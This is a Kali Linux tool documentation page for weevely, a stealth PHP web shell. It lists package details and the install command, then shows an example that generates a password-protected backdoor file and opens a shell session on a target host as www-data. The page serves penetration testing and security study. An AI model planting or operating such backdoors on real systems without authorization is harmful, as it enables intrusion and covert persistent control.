---
Title: weevely
Homepage: https://github.com/epinna/weevely3/
Repository: https://salsa.debian.org/pkg-security-team/weevely
Architectures: all
Version: 4.0.1-2
Metapackages: kali-linux-default kali-linux-everything kali-linux-headless kali-linux-large kali-tools-post-exploitation kali-tools-web 
Icon: images/weevely-logo.svg
PackagesInfo: |
 ### weevely
 
  Weevely is a stealth PHP web shell that simulate telnet-like
  connection. It is an essential tool for web application post
  exploitation, and can be used as stealth backdoor or as a
  web shell to manage legit web accounts, even free hosted
  ones.
 
 **Installed size:** `889 KB`  
 **How to install:** `sudo apt install weevely`  
 
 {{< spoiler "Dependencies:" >}}
 * python3
 * python3-dateutil
 * python3-mako
 * python3-prettytable
 * python3-socks
 * python3-yaml
 {{< /spoiler >}}
 
 ##### weevely
 
 Weaponized web shell
 
 ```
 root@kali:~# weevely -h
 usage: weevely [-h] {terminal,session,generate} ...
 
 positional arguments:
   {terminal,session,generate}
     terminal            Run terminal or command on the target
     session             Recover an existing session
     generate            Generate new agent
 
 options:
   -h, --help            show this help message and exit
 ```
 
 - - -
 
---
{{% hidden-comment "<!--Do not edit anything above this line-->" %}}

## weevely Usage Example

Generate a PHP backdoor (`generate`) protected with the given password (`s3cr3t`).

```
root@kali:~# weevely generate s3cr3t
[generate.php] Backdoor file 'weevely.php' created with password 's3cr3t'
root@kali:~# weevely http://192.168.1.202/weevely.php s3cr3t
      ________                     __
     |  |  |  |----.----.-.--.----'  |--.--.
     |  |  |  | -__| -__| |  | -__|  |  |  |
     |________|____|____|___/|____|__|___  | v1.1
                                     |_____|
              Stealth tiny web shell

[+] Browse filesystem, execute commands or list available modules with ':help'
[+] Current session: 'sessions/192.168.1.202/weevely.session'

www-data@kali:/var/www $ uname
Linux
www-data@kali:/var/www $ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
